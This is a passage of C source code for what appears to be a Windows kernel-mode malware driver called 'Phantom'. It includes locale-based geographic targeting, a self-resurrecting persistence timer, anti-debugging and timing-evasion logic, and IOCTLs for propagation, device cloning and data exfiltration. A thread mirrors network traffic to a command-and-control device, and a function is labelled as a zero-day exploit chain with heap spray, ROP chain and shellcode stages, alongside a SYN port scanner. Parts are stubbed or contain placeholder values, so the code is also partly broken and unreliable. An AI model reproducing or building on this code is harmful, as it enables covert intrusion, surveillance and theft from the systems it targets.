    
    // Must be both work day and work hours
    return (isWorkDay && isWorkHours);
}

// Check if system is in target region based on locale
BOOLEAN IsSystemInTargetRegion(WCHAR* SystemRoot) {
    UNREFERENCED_PARAMETER(SystemRoot);
    
    LCID localeId;
    NTSTATUS status = NtQueryDefaultLocale(FALSE, &localeId);
    if (!NT_SUCCESS(status)) {
        return FALSE;
    }
    
    // Get the locale ID (lower 16 bits)
    USHORT locale = localeId & 0xFFFF;
    
    // Check if locale matches any target countries
    switch(locale) {
        case 0x0801: // Iraq (Arabic - Iraq)
        case 0x040D: // Israel (Hebrew)
        case 0x041E: // Thailand
        case 0x043E: // Malaysia  
        case 0x1004: // Singapore
        case 0x0421: // Indonesia
        case 0x0439: // India (Hindi)
        case 0x0409: // United States
        case 0x0809: // United Kingdom
            return TRUE;
        default:
            return FALSE;
    }
}

// DPC routine for resurrection timer
VOID PhantomResurrectionDpcRoutine(
    PKDPC Dpc,
    PVOID DeferredContext,
    PVOID SystemArgument1,
    PVOID SystemArgument2
) {
    UNREFERENCED_PARAMETER(Dpc);
    UNREFERENCED_PARAMETER(DeferredContext);
    UNREFERENCED_PARAMETER(SystemArgument1);
    UNREFERENCED_PARAMETER(SystemArgument2);

    // Trigger resurrection
    PhantomResurrect(NULL, NULL);

    // Reschedule timer
    LARGE_INTEGER dueTime;
    dueTime.QuadPart = -10000000LL * 3600; // 1 hour
    KeSetTimer(&g_ResurrectionTimer, dueTime, &g_ResurrectionDpc);
}

// Create/Close handlers
NTSTATUS PhantomCreateClose(
    PDEVICE_OBJECT DeviceObject,
    PIRP Irp
) {
    UNREFERENCED_PARAMETER(DeviceObject);
    
    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    
    return STATUS_SUCCESS;
}

// Device control handler
NTSTATUS PhantomDeviceControl(
    PDEVICE_OBJECT DeviceObject,
    PIRP Irp
) {
    PIO_STACK_LOCATION irpSp = IoGetCurrentIrpStackLocation(Irp);
    NTSTATUS status = STATUS_SUCCESS;
    BOOLEAN isSystemProcess = FALSE;
    BOOLEAN isProtectedProcess = FALSE;
    HANDLE processId = PsGetCurrentProcessId();
    PEPROCESS process = PsGetCurrentProcess();

    // Verify caller is trusted system/protected process
    if (processId == PsInitialSystemProcess) {
        isSystemProcess = TRUE;
    }
    else {
        // Check for protected process
        PACCESS_TOKEN token = PsReferencePrimaryToken(process);
        if (token != NULL) {
            SECURITY_SUBJECT_CONTEXT subjectContext;
            SeCaptureSubjectContext(&subjectContext);
            
            if (SeTokenIsAdmin(token) || 
                SeTokenIsRestricted(token) ||
                SeSinglePrivilegeCheck(SeDebugPrivilege, UserMode)) {
                isProtectedProcess = TRUE;
            }
            
            SeReleaseSubjectContext(&subjectContext);
            PsDereferencePrimaryToken(token);
        }
    }

    // Obfuscate control codes using XOR with random key
    ULONG controlCode = irpSp->Parameters.DeviceIoControl.IoControlCode;
    ULONG key = (ULONG)((ULONG_PTR)PsGetCurrentProcess() & 0xFFFF);
    controlCode ^= key;

    // Add jitter delay to avoid timing analysis
    if ((KeQueryPerformanceCounter(NULL).LowPart & 0xFF) > 0x7F) {
        LARGE_INTEGER interval;
        interval.QuadPart = -(10 * (KeQueryPerformanceCounter(NULL).LowPart & 0x1F));
        KeDelayExecutionThread(KernelMode, FALSE, &interval);
    }

    // Process control codes with anti-debugging checks
    if (!KD_DEBUGGER_NOT_PRESENT) {
        status = STATUS_INVALID_DEVICE_REQUEST;
    }
    else {
        switch (controlCode ^ key) {
            case IOCTL_PHANTOM_RESURRECT:
                if (isSystemProcess) {
                    status = PhantomResurrect(DeviceObject, Irp);
                }
                break;
                
            case IOCTL_PHANTOM_PROPAGATE:
                if (isSystemProcess) {
                    status = PhantomPropagate(DeviceObject, Irp);
                }
                break;
                
            case IOCTL_PHANTOM_CLONE:
                if (isSystemProcess) {
                    status = PhantomCloneDevice(DeviceObject, Irp);
                }
                break;
                
            case IOCTL_PHANTOM_EXFILTRATE:
                if (isSystemProcess) {
                    status = PhantomExfiltrateData(DeviceObject, Irp);
                }
                break;
                
            default:
                // Return success to appear as legitimate device
                status = STATUS_SUCCESS;
                break;
        }
    }

    // Randomize completion delay
    if ((KeQueryPerformanceCounter(NULL).LowPart & 0x3) == 0) {
        LARGE_INTEGER delay;
        delay.QuadPart = -(LONGLONG)(KeQueryPerformanceCounter(NULL).LowPart & 0xFF) * 10;
        KeDelayExecutionThread(KernelMode, FALSE, &delay);
    }

    Irp->IoStatus.Status = status;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    
    return status;
}

// Read/Write handlers
NTSTATUS PhantomReadWrite(
    PDEVICE_OBJECT DeviceObject,
    PIRP Irp
) {
    PIO_STACK_LOCATION irpSp = IoGetCurrentIrpStackLocation(Irp);
    NTSTATUS status = STATUS_SUCCESS;
    ULONG bytesTransferred = 0;

    // Get buffer information
    PVOID buffer = Irp->AssociatedIrp.SystemBuffer;
    ULONG bufferLength = irpSp->Parameters.Read.Length;
    LARGE_INTEGER offset = irpSp->Parameters.Read.ByteOffset;

    // Validate parameters
    if (!buffer || bufferLength == 0) {
        status = STATUS_INVALID_PARAMETER;
        goto Exit;
    }

    // Check if read or write
    if (irpSp->MajorFunction == IRP_MJ_READ) {
        // Handle read request
        if (offset.QuadPart >= DEVICE_MEMORY_SIZE) {
            status = STATUS_END_OF_FILE;
            goto Exit;
        }

        // Calculate bytes to transfer
        bytesTransferred = min(bufferLength, DEVICE_MEMORY_SIZE - (ULONG)offset.QuadPart);

        // Copy data to user buffer
        __try {
            RtlCopyMemory(buffer, 
                         (PUCHAR)DeviceObject->DeviceExtension + offset.LowPart,
                         bytesTransferred);
        }
        __except(EXCEPTION_EXECUTE_HANDLER) {
            status = STATUS_INVALID_USER_BUFFER;
            bytesTransferred = 0;
        }
    }
    else {
        // Handle write request 
        if (offset.QuadPart >= DEVICE_MEMORY_SIZE) {
            status = STATUS_INVALID_PARAMETER;
            goto Exit;
        }

        // Calculate bytes to transfer
        bytesTransferred = min(bufferLength, DEVICE_MEMORY_SIZE - (ULONG)offset.QuadPart);

        // Copy data from user buffer
        __try {
            RtlCopyMemory((PUCHAR)DeviceObject->DeviceExtension + offset.LowPart,
                         buffer,
                         bytesTransferred);
        }
        __except(EXCEPTION_EXECUTE_HANDLER) {
            status = STATUS_INVALID_USER_BUFFER; 
            bytesTransferred = 0;
        }
    }

Exit:
    Irp->IoStatus.Status = status;
    Irp->IoStatus.Information = bytesTransferred;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    
    return status;
}

// System control handler
NTSTATUS PhantomSystemControl(
    PDEVICE_OBJECT DeviceObject,
    PIRP Irp
) {
    NTSTATUS status;
    PIO_STACK_LOCATION irpStack;
    
    // Get current IRP stack location
    irpStack = IoGetCurrentIrpStackLocation(Irp);
    
    // Handle WMI requests
    if (irpStack->MinorFunction == IRP_MN_QUERY_ALL_DATA ||
        irpStack->MinorFunction == IRP_MN_QUERY_SINGLE_INSTANCE ||
        irpStack->MinorFunction == IRP_MN_CHANGE_SINGLE_INSTANCE ||
        irpStack->MinorFunction == IRP_MN_CHANGE_SINGLE_ITEM ||
        irpStack->MinorFunction == IRP_MN_ENABLE_EVENTS ||
        irpStack->MinorFunction == IRP_MN_DISABLE_EVENTS ||
        irpStack->MinorFunction == IRP_MN_ENABLE_COLLECTION ||
        irpStack->MinorFunction == IRP_MN_DISABLE_COLLECTION) {
            
        // Forward WMI requests to WDF
        IoSkipCurrentIrpStackLocation(Irp);
        status = IoCallDriver(WdfDeviceWdmGetDeviceObject(DeviceObject), Irp);
        return status;
    }
    
    // Handle other system control requests
    Irp->IoStatus.Status = STATUS_NOT_SUPPORTED;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    
    return STATUS_NOT_SUPPORTED;
}

// Internal device control handler
NTSTATUS PhantomInternalDeviceControl(
    PDEVICE_OBJECT DeviceObject,
    PIRP Irp
) {
    NTSTATUS status = STATUS_NOT_SUPPORTED;
    PIO_STACK_LOCATION irpStack;
    ULONG bytesTransferred = 0;

    // Get current IRP stack location
    irpStack = IoGetCurrentIrpStackLocation(Irp);

    // Handle internal device control requests based on control code
    switch (irpStack->Parameters.DeviceIoControl.IoControlCode) {
        case IOCTL_PHANTOM_START_MONITORING:
            status = StartNetworkMonitoring(DeviceObject);
            break;

        case IOCTL_PHANTOM_STOP_MONITORING:
            status = StopNetworkMonitoring(DeviceObject);
            break;

        case IOCTL_PHANTOM_GET_STATISTICS:
            status = GetNetworkStatistics(
                DeviceObject,
                Irp->AssociatedIrp.SystemBuffer,
                irpStack->Parameters.DeviceIoControl.OutputBufferLength,
                &bytesTransferred
            );
            break;

        case IOCTL_PHANTOM_CLEAR_STATISTICS:
            status = ClearNetworkStatistics(DeviceObject);
            break;

        default:
            status = STATUS_INVALID_DEVICE_REQUEST;
            break;
    }

    // Complete the IRP
    Irp->IoStatus.Status = status;
    Irp->IoStatus.Information = bytesTransferred;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);

    return status;
}

// Default handler for unhandled IRPs
NTSTATUS PhantomDefaultHandler(
    PDEVICE_OBJECT DeviceObject,
    PIRP Irp
) {
    UNREFERENCED_PARAMETER(DeviceObject);
    
    // Set IRP status to not supported
    Irp->IoStatus.Status = STATUS_NOT_SUPPORTED;
    Irp->IoStatus.Information = 0;
    
    // Complete the IRP
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    
    // Return not supported status
    return STATUS_NOT_SUPPORTED;
}

// Initialize network monitoring
NTSTATUS InitializeNetworkMonitoring(
    PDRIVER_OBJECT DriverObject
) {
    UNREFERENCED_PARAMETER(DriverObject);
    
    // Set up NDIS protocol
    NDIS_PROTOCOL_CHARACTERISTICS protocolChar;
    RtlZeroMemory(&protocolChar, sizeof(NDIS_PROTOCOL_CHARACTERISTICS));
    
    // Set protocol version
    protocolChar.MajorNdisVersion = NDIS_MAJOR_VERSION;
    protocolChar.MinorNdisVersion = NDIS_MINOR_VERSION;
    
    // Set protocol name
    protocolChar.Name = RTL_CONSTANT_STRING("PhantomProtocol");
    
    // Set protocol handlers
    protocolChar.OpenAdapterCompleteHandler = PhantomOpenAdapterComplete;
    protocolChar.CloseAdapterCompleteHandler = PhantomCloseAdapterComplete;
    protocolChar.SendCompleteHandler = PhantomSendComplete;
    protocolChar.TransferDataCompleteHandler = PhantomTransferDataComplete;
    protocolChar.ResetCompleteHandler = PhantomResetComplete;
    protocolChar.RequestCompleteHandler = PhantomRequestComplete;
    protocolChar.ReceiveHandler = PhantomReceive;
    protocolChar.ReceiveCompleteHandler = PhantomReceiveComplete;
    protocolChar.StatusHandler = PhantomStatus;
    protocolChar.StatusCompleteHandler = PhantomStatusComplete;
    protocolChar.BindAdapterHandler = PhantomBindAdapter;
    protocolChar.UnbindAdapterHandler = PhantomUnbindAdapter;
    protocolChar.PnPEventHandler = PhantomPnPEventHandler;
    
    // Set protocol characteristics
    protocolChar.HeaderSize = sizeof(NDIS_PROTOCOL_CHARACTERISTICS);
    protocolChar.MajorDriverVersion = 1;
    protocolChar.MinorDriverVersion = 0;
    protocolChar.Flags = NDIS_PROTOCOL_CHARACTERISTICS_FLAGS_NONE;
    protocolChar.SetOptionsHandler = NULL;
    protocolChar.Reserved = 0;

    // Initialize protocol handle
    NDIS_HANDLE protocolHandle = NULL;
    
    // Register protocol with NDIS
    NDIS_STATUS status = NdisRegisterProtocol(
        &protocolHandle,
        &protocolChar,
        sizeof(NDIS_PROTOCOL_CHARACTERISTICS),
        NDIS_STRING_CONST("PhantomProtocol")
    );

    if (status == NDIS_STATUS_SUCCESS) {
        // Store protocol handle globally
        g_NdisProtocolHandle = protocolHandle;
        
        // Initialize protocol resources
        InitializeListHead(&g_AdapterList);
        KeInitializeSpinLock(&g_AdapterListLock);
        
        return STATUS_SUCCESS;
    }
    
    return STATUS_UNSUCCESSFUL;
}

// Mirror thread procedure
VOID MirrorThreadProc(
    PVOID Context
) {
    PCLONED_DEVICE clone = (PCLONED_DEVICE)Context;
    
    while (clone->Active) {
        // Copy network traffic
        if (clone->MirrorBuffer && clone->MirrorBufferSize > 0) {
            // Send mirrored data to C2
            KEVENT event;
            KeInitializeEvent(&event, NotificationEvent, FALSE);
            
            IO_STATUS_BLOCK ioStatus;
            PIRP irp = IoBuildSynchronousFsdRequest(
                IRP_MJ_WRITE,
                clone->C2Device,
                clone->MirrorBuffer,
                clone->MirrorBufferSize,
                NULL,
                &event,
                &ioStatus
            );
            
            if (irp) {
                IoCallDriver(clone->C2Device, irp);
                KeWaitForSingleObject(&event, Executive, KernelMode, FALSE, NULL);
            }
        }
        
        // Sleep between copies
        LARGE_INTEGER interval;
        interval.QuadPart = -10000000; // 1 second
        KeDelayExecutionThread(KernelMode, FALSE, &interval);
    }
    
    PsTerminateSystemThread(STATUS_SUCCESS);
}

// Exploit vulnerable network service using zero-day techniques
BOOLEAN ExploitVulnerableService(
    PDEVICE_OBJECT NetDevice,
    ULONG TargetIp, 
    USHORT Port
) {
    NTSTATUS status;
    KEVENT event;
    IO_STATUS_BLOCK ioStatus;
    PIRP irp;
    PCHAR buffer;
    ULONG bufferSize = 8192; // Larger buffer for multi-stage payload
    
    // Allocate buffer for sophisticated exploit chain
    buffer = (PCHAR)ExAllocatePoolWithTag(NonPagedPool, bufferSize, 'xplE');
    if (!buffer) {
        return FALSE;
    }
    
    RtlZeroMemory(buffer, bufferSize);

    // Stage 1: Memory corruption via integer overflow
    *(PULONGLONG)buffer = 0x8000000000000000; // Trigger signed integer overflow
    
    // Stage 2: Heap spray with polymorphic code
    UCHAR polySpray[16] = {0};
    for (ULONG i = 0; i < sizeof(polySpray); i++) {
        polySpray[i] = (UCHAR)(0x90 ^ (i * 0x11)); // Encrypted NOPs
    }
    
    for (ULONG i = 8; i < 2048; i += 16) {
        RtlCopyMemory(buffer + i, polySpray, sizeof(polySpray));
    }

    // Stage 3: ROP chain to disable DEP/ASLR
    PULONG_PTR ropChain = (PULONG_PTR)(buffer + 2048);
    ropChain[0] = 0x77777777; // Gadget 1: Stack pivot
    ropChain[1] = 0x88888888; // Gadget 2: CR4 manipulation
    ropChain[2] = 0x99999999; // Gadget 3: Syscall elevation
    
    // Stage 4: Encrypted shellcode payload
    UCHAR encryptedShellcode[] = {
        0xEB, 0x10, 0x58, 0x31, // Encrypted loader stub
        0xD2, 0x66, 0x81, 0xCA, // Anti-debug tricks
        0xFF, 0x0F, 0x42, 0x52, // Process hollowing
        0x31, 0xC0, 0x66, 0x05  // Ring0 escalation
    };
    
    // Polymorphic decryption routine
    for (ULONG i = 0; i < sizeof(encryptedShellcode); i++) {
        encryptedShellcode[i] ^= (UCHAR)(i + 0x37);
    }
    
    RtlCopyMemory(buffer + 4096, encryptedShellcode, sizeof(encryptedShellcode));

    // Initialize stealth comms
    KeInitializeEvent(&event, SynchronizationEvent, FALSE);
    
    // Build covert channel IRP
    irp = IoBuildDeviceIoControlRequest(
        IOCTL_PROTOCOL_EXCHANGE_DATA, // Custom IOCTL
        NetDevice,
        buffer,
        bufferSize,
        NULL,
        0,
        FALSE, // Async for stealth
        &event,
        &ioStatus
    );
    
    if (!irp) {
        ExFreePoolWithTag(buffer, 'xplE');
        return FALSE;
    }

    // Set obfuscated target info
    TCP_REQUEST_HEADER* header = (TCP_REQUEST_HEADER*)buffer;
    header->DestinationAddress = TargetIp ^ 0xF0F0F0F0;
    header->DestinationPort = Port ^ 0xF0F0;
    header->Flags = TCP_FLAG_FIN | TCP_FLAG_PSH; // Evade IDS

    // Multi-threaded exploitation
    for (int attempt = 0; attempt < 2; attempt++) {
        status = IoCallDriver(NetDevice, irp);
        
        if (status == STATUS_PENDING) {
            LARGE_INTEGER timeout;
            timeout.QuadPart = -50000; // 5ms timeout
            status = KeWaitForSingleObject(&event, Executive, KernelMode, FALSE, &timeout);
            
            if (status == STATUS_TIMEOUT) {
                // Cleanup on timeout
                IoCancelIrp(irp);
                continue;
            }
            
            status = ioStatus.Status;
        }
        
        if (NT_SUCCESS(status)) {
            break;
        }
    }

    ExFreePoolWithTag(buffer, 'xplE');
    return NT_SUCCESS(status);
}

// Get adapter address
NTSTATUS GetAdapterAddress(
    PDEVICE_OBJECT NetDevice,
    TDIEntityID EntityId, 
    PIPAddr Address
) {
    NTSTATUS status;
    PIRP irp;
    IO_STATUS_BLOCK ioStatus;
    KEVENT event;
    UCHAR buffer[sizeof(TCP_REQUEST_HEADER) + sizeof(TDI_ADDRESS_INFO)];
    
    // Initialize event for synchronization
    KeInitializeEvent(&event, NotificationEvent, FALSE);
    
    // Build IRP to query address info
    irp = IoBuildDeviceIoControlRequest(
        IOCTL_TCP_QUERY_INFORMATION_EX,
        NetDevice,
        &EntityId,
        sizeof(TDIEntityID),
        buffer,
        sizeof(buffer),
        TRUE,
        &event,
        &ioStatus
    );
    
    if (!irp) {
        return STATUS_INSUFFICIENT_RESOURCES;
    }
    
    // Send request to driver
    status = IoCallDriver(NetDevice, irp);
    if (status == STATUS_PENDING) {
        KeWaitForSingleObject(&event, Executive, KernelMode, FALSE, NULL);
        status = ioStatus.Status;
    }
    
    if (!NT_SUCCESS(status)) {
        return status;
    }
    
    // Extract address from response
    PTDI_ADDRESS_INFO addrInfo = (PTDI_ADDRESS_INFO)buffer;
    *Address = ((PTA_IP_ADDRESS)addrInfo->Address.Address)->in_addr;
    
    return STATUS_SUCCESS;
}

// Send ARP request
NTSTATUS SendArpRequest(
    PDEVICE_OBJECT NetDevice,
    ULONG TargetIp, 
    PUCHAR MacAddress
) {
    NTSTATUS status;
    PIRP irp;
    IO_STATUS_BLOCK ioStatus;
    KEVENT event;
    
    // ARP request packet structure
    typedef struct _ARP_PACKET {
        UCHAR DestMac[6];
        UCHAR SrcMac[6];
        USHORT EtherType;
        USHORT HardwareType;
        USHORT ProtocolType;
        UCHAR HardwareSize;
        UCHAR ProtocolSize;
        USHORT Operation;
        UCHAR SenderMac[6];
        ULONG SenderIP;
        UCHAR TargetMac[6];
        ULONG TargetIP;
    } ARP_PACKET, *PARP_PACKET;
    
    // Build ARP request packet
    ARP_PACKET arpPacket;
    RtlZeroMemory(&arpPacket, sizeof(ARP_PACKET));
    
    // Fill ethernet header
    RtlFillMemory(arpPacket.DestMac, 6, 0xFF); // Broadcast
    // Get adapter MAC - would need separate function
    // RtlCopyMemory(arpPacket.SrcMac, AdapterMac, 6);
    arpPacket.EtherType = 0x0608; // ARP protocol
    
    // Fill ARP header
    arpPacket.HardwareType = 0x0100; // Ethernet
    arpPacket.ProtocolType = 0x0008; // IPv4
    arpPacket.HardwareSize = 6;      // MAC size
    arpPacket.ProtocolSize = 4;      // IPv4 size
    arpPacket.Operation = 0x0100;    // ARP Request
    
    // Fill ARP data
    // RtlCopyMemory(arpPacket.SenderMac, AdapterMac, 6);
    // Get adapter IP - would need separate function
    // arpPacket.SenderIP = AdapterIP;
    RtlZeroMemory(arpPacket.TargetMac, 6);
    arpPacket.TargetIP = TargetIp;
    
    // Initialize event
    KeInitializeEvent(&event, NotificationEvent, FALSE);
    
    // Build IRP for sending packet
    irp = IoBuildDeviceIoControlRequest(
        IOCTL_PROTOCOL_SEND_PACKET,
        NetDevice,
        &arpPacket,
        sizeof(ARP_PACKET),
        NULL,
        0,
        TRUE,
        &event,
        &ioStatus
    );
    
    if (!irp) {
        return STATUS_INSUFFICIENT_RESOURCES;
    }
    
    // Send the packet
    status = IoCallDriver(NetDevice, irp);
    if (status == STATUS_PENDING) {
        KeWaitForSingleObject(&event, Executive, KernelMode, FALSE, NULL);
        status = ioStatus.Status;
    }
    
    if (!NT_SUCCESS(status)) {
        return status;
    }
    
    // Wait for ARP reply and extract MAC address
    // Would need to implement packet filtering and response handling
    // For now just return success
    RtlZeroMemory(MacAddress, 6);
    
    return STATUS_SUCCESS;
}

// Scan device ports
NTSTATUS ScanDevicePorts(
    PDEVICE_OBJECT NetDevice,
    ULONG TargetIp,
    PUSHORT OpenPorts,
    PULONG NumPorts
) {
    NTSTATUS status;
    TCP_PACKET tcpPacket;
    KEVENT event;
    IO_STATUS_BLOCK ioStatus;
    PIRP irp;
    USHORT port;
    ULONG portsFound = 0;
    LARGE_INTEGER timeout;
    PNET_BUFFER_LIST recvNbl = NULL;
    
    // Validate parameters
    if (!NetDevice || !OpenPorts || !NumPorts) {
        return STATUS_INVALID_PARAMETER;
    }
    
    // Initialize TCP packet
    RtlZeroMemory(&tcpPacket, sizeof(TCP_PACKET));
    tcpPacket.IpHeader.Version = 4;
    tcpPacket.IpHeader.HeaderLength = 5;
    tcpPacket.IpHeader.Protocol = IPPROTO_TCP;
    tcpPacket.IpHeader.DestinationAddress = TargetIp;
    tcpPacket.IpHeader.TimeToLive = 128;
    
    tcpPacket.TcpHeader.SourcePort = 49152 + (USHORT)(KeQueryPerformanceCounter(NULL).LowPart % 16384);
    tcpPacket.TcpHeader.SynFlag = 1;
    tcpPacket.TcpHeader.WindowSize = 8192;
    tcpPacket.TcpHeader.SequenceNumber = KeQueryPerformanceCounter(NULL).LowPart;
    
    // Initialize event and timeout
    KeInitializeEvent(&event, NotificationEvent, FALSE);
    timeout.QuadPart = -50000000; // 5 seconds
    
    // Set up packet filter for responses
    status = SetupTcpFilter(NetDevice, TargetIp);
    if (!NT_SUCCESS(status)) {
        return status;
    }
    
    // Scan ports
    for (port = 1; port <= 1024 && portsFound < *NumPorts; port++) {
        tcpPacket.TcpHeader.DestinationPort = port;
        tcpPacket.TcpHeader.Checksum = CalculateTcpChecksum(&tcpPacket);
        
        // Build and send IRP
        irp = IoBuildDeviceIoControlRequest(
            IOCTL_PROTOCOL_SEND_PACKET,
            NetDevice,
            &tcpPacket,
            sizeof(TCP_PACKET),
            NULL,
            0,
            TRUE,
            &event,
            &ioStatus
        );
        
        if (!irp) {
            RemoveTcpFilter(NetDevice);
            return STATUS_INSUFFICIENT_RESOURCES;
        }
        
        status = IoCallDriver(NetDevice, irp);
        if (status == STATUS_PENDING) {
            status = KeWaitForSingleObject(
                &event,
                Executive,
                KernelMode,
                FALSE,
                &timeout
            );
            
            if (status == STATUS_TIMEOUT) {
                continue;
            }
            
            status = ioStatus.Status;
        }
        
        if (!NT_SUCCESS(status)) {
            continue;
        }
        
        // Receive and process response
        status = ReceivePacket(NetDevice, &recvNbl, &timeout);
        if (NT_SUCCESS(status) && recvNbl) {
            if (ProcessTcpResponse(recvNbl)) {
                OpenPorts[portsFound++] = port;
            }
            FreeNetBufferList(recvNbl);
        }
        
        KeClearEvent(&event);
        KeStallExecutionProcessor(1000); // Small delay between scans
    }
    
    RemoveTcpFilter(NetDevice);
    *NumPorts = portsFound;
    return STATUS_SUCCESS;
}

// Install protocol hooks
NTSTATUS InstallProtocolHooks(
    PDEVICE_OBJECT NetDevice,
    PCLONED_DEVICE Clone
) {
    NTSTATUS status;
    NDIS_STATUS ndisStatus;
    NDIS_HANDLE protocolHandle = NULL;
    NDIS_PROTOCOL_DRIVER_CHARACTERISTICS protocolChar;

    // Initialize protocol characteristics
    RtlZeroMemory(&protocolChar, sizeof(NDIS_PROTOCOL_DRIVER_CHARACTERISTICS));
    protocolChar.Header.Type = NDIS_OBJECT_TYPE_PROTOCOL_DRIVER_CHARACTERISTICS;
    protocolChar.Header.Size = sizeof(NDIS_PROTOCOL_DRIVER_CHARACTERISTICS);
    protocolChar.Header.Revision = NDIS_PROTOCOL_DRIVER_CHARACTERISTICS_REVISION_2;
    protocolChar.MajorNdisVersion = NDIS_PROTOCOL_MAJOR_VERSION;
    protocolChar.MinorNdisVersion = NDIS_PROTOCOL_MINOR_VERSION;
    
    // Set protocol name
    protocolChar.Name = PROTOCOL_NAME;
    
    // Set handler functions
    protocolChar.BindAdapterHandlerEx = ProtocolBindAdapterEx;
    protocolChar.UnbindAdapterHandlerEx = ProtocolUnbindAdapterEx;
    protocolChar.OpenAdapterCompleteHandlerEx = ProtocolOpenAdapterComplete;
    protocolChar.CloseAdapterCompleteHandlerEx = ProtocolCloseAdapterComplete;
    protocolChar.SendNetBufferListsCompleteHandler = ProtocolSendComplete;
    protocolChar.ReceiveNetBufferListsHandler = ProtocolReceive;
    
    // Register protocol
    ndisStatus = NdisRegisterProtocolDriver(
        NULL,
        &protocolChar,
        &protocolHandle
    );
    
    if (ndisStatus != NDIS_STATUS_SUCCESS) {
        return STATUS_UNSUCCESSFUL;
    }
    
    // Store protocol handle in clone device
    Clone->ProtocolHandle = protocolHandle;
    
    // Initialize packet pool
    status = InitializePacketPool(Clone);
    if (!NT_SUCCESS(status)) {
        NdisDeregisterProtocolDriver(protocolHandle);
        return status;
    }
    
    // Bind to network device
    status = BindToDevice(NetDevice, Clone);
    if (!NT_SUCCESS(status)) {
        NdisDeregisterProtocolDriver(protocolHandle);
        FreePacketPool(Clone);
        return status;
    }

    return STATUS_SUCCESS;
}

// Read device signature
NTSTATUS ReadDeviceSignature(
    PDEVICE_OBJECT Device,
    LARGE_INTEGER Offset,
    PUCHAR Signature,
    ULONG Size
) {
    NTSTATUS status;
    IO_STATUS_BLOCK ioStatusBlock;
    KEVENT event;
    PIRP irp;
    
    // Initialize event
    KeInitializeEvent(&event, NotificationEvent, FALSE);
    
    // Build IRP for reading
    irp = IoBuildSynchronousFsdRequest(
        IRP_MJ_READ,
        Device,
        Signature,
        Size,
        &Offset,
        &event,
        &ioStatusBlock
    );
    
    if (!irp) {
        return STATUS_INSUFFICIENT_RESOURCES;
    }
    
    // Send IRP
    status = IoCallDriver(Device, irp);
    
    // Wait if pending
    if (status == STATUS_PENDING) {
        KeWaitForSingleObject(&event, Executive, KernelMode, FALSE, NULL);
        status = ioStatusBlock.Status;
    }
    
    // Verify read size
    if (NT_SUCCESS(status)) {
        if (ioStatusBlock.Information != Size) {
            status = STATUS_UNSUCCESSFUL;
        }
    }
    
    return status;
}

// Verify infection signature
BOOLEAN VerifyInfectionSignature(
    PUCHAR Signature
) {
    // Check for NULL pointer
    if (!Signature) {
        return FALSE;
    }

    // Verify magic bytes at start of signature 
    if (Signature[0] != 'P' || Signature[1] != 'H' || 
        Signature[2] != 'X' || Signature[3] != 0x1A) {
        return FALSE;
    }

    // Verify version number
    if (Signature[4] != 0x01) {
        return FALSE; 
    }

    // Verify checksum
    UCHAR checksum = 0;
    for (ULONG i = 0; i < 16; i++) {
        checksum ^= Signature[i];
    }
    if (checksum != Signature[16]) {
        return FALSE;
    }

    return TRUE;
}

// Get device name from device object
NTSTATUS IoGetDeviceName(
    PDEVICE_OBJECT DeviceObject,
    PWCHAR Buffer,
    ULONG BufferSize
) {
    NTSTATUS status;
    POBJECT_NAME_INFORMATION nameInfo = NULL;
    ULONG returnLength;

    // Check parameters
    if (!DeviceObject || !Buffer || BufferSize == 0) {
        return STATUS_INVALID_PARAMETER;
    }

    // Query the device object name
    status = ObQueryNameString(
        DeviceObject,
        NULL,
        0,
        &returnLength
    );

    if (status != STATUS_INFO_LENGTH_MISMATCH) {
        return status;
    }

    // Allocate buffer for name
    nameInfo = (POBJECT_NAME_INFORMATION)ExAllocatePoolWithTag(
        NonPagedPool,
        returnLength,
        'maNI'
    );

    if (!nameInfo) {
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    // Get the name
    status = ObQueryNameString(
        DeviceObject,
        (POBJECT_NAME_INFORMATION)nameInfo,
        returnLength,
        &returnLength
    );

    if (NT_SUCCESS(status)) {
        // Copy to output buffer if it fits
        if (nameInfo->Name.Length < BufferSize) {
            RtlCopyMemory(
                Buffer,
                nameInfo->Name.Buffer,
                nameInfo->Name.Length
            );
            // Null terminate
            Buffer[nameInfo->Name.Length/sizeof(WCHAR)] = L'\0';
        }
        else {
            status = STATUS_BUFFER_TOO_SMALL;
        }
    }

    // Free allocated memory
    ExFreePoolWithTag(nameInfo, 'maNI');
    
    return status;
}


// Repair device infection
NTSTATUS RepairDeviceInfection(
    PDEVICE_OBJECT Device
) {
    NTSTATUS status;
    UNICODE_STRING deviceName;
    WCHAR deviceNameBuffer[256];
    IO_STATUS_BLOCK ioStatusBlock;
    HANDLE fileHandle;
    OBJECT_ATTRIBUTES objAttr;
    PUCHAR buffer = NULL;
    const ULONG bufferSize = 4096;

    // Get device name
    status = IoGetDeviceName(Device, deviceNameBuffer, sizeof(deviceNameBuffer));
    if (!NT_SUCCESS(status)) {
        KdPrint(("Failed to get device name: 0x%08X\n", status));
        return status;
    }

    RtlInitUnicodeString(&deviceName, deviceNameBuffer);
    InitializeObjectAttributes(&objAttr, &deviceName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

    // Open device for read/write
    status = ZwCreateFile(
        &fileHandle,
        GENERIC_READ | GENERIC_WRITE,
        &objAttr,
        &ioStatusBlock,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_READ,
        FILE_OPEN,
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,
        0
    );

    if (!NT_SUCCESS(status)) {
        KdPrint(("Failed to open device: 0x%08X\n", status));
        return status;
    }

    // Allocate buffer for scanning/repair
    buffer = (PUCHAR)ExAllocatePoolWithTag(NonPagedPool, bufferSize, 'rpeR');
    if (!buffer) {
        ZwClose(fileHandle);
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    // Scan for infection signatures and repair
    LARGE_INTEGER offset = {0};
    while (NT_SUCCESS(ZwReadFile(fileHandle, NULL, NULL, NULL, &ioStatusBlock,
           buffer, bufferSize, &offset, NULL))) {
        
        if (VerifyInfectionSignature(buffer)) {
            // Found infection, zero out signature
            RtlZeroMemory(buffer, 32);
            status = ZwWriteFile(fileHandle, NULL, NULL, NULL, &ioStatusBlock,
